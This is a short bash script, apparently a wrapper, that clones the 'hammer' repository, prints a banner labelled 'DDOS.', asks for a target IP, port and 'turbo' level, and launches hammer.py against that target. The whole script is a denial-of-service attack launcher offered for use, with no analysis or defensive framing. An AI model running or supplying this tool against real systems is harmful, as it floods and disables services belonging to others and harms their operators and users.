git clone http://github.com/cyweb/hammer
cd hammer

clear
q="-e"
e="echo"
s="sleep 1"
ss="sleep 2"
sss="sleep 3"
#color
m="\033[1;31m"
h="\033[1;32m"
k="\033[1;33m"
b="\033[1;34m"
bl="\033[1;36m"
p="\033[1;37m"
#figlet

$e $q $m "  ________         .__   .__                        \n /  _____/ _____   |  |  |__|_______  __ __   ______\n/   \  ___ \__  \  |  |  |  |\_  __ \|  |  \ /  ___/\n\    \_\  \ / __ \_|  |__|  | |  | \/|  |  / \___ \ \n \______  /(____  /|____/|__| |__|   |____/ /____  >\n        \/      \/                               \/ "
echo $q $b "						DDOS."
#code/command
echo $q $h
read -p "IP ==> " isi
read -p "PORT ==> " isii
read -p "TURBO ==> " isiii

python3 hammer.py -s $isi -p $isii -t $isiii

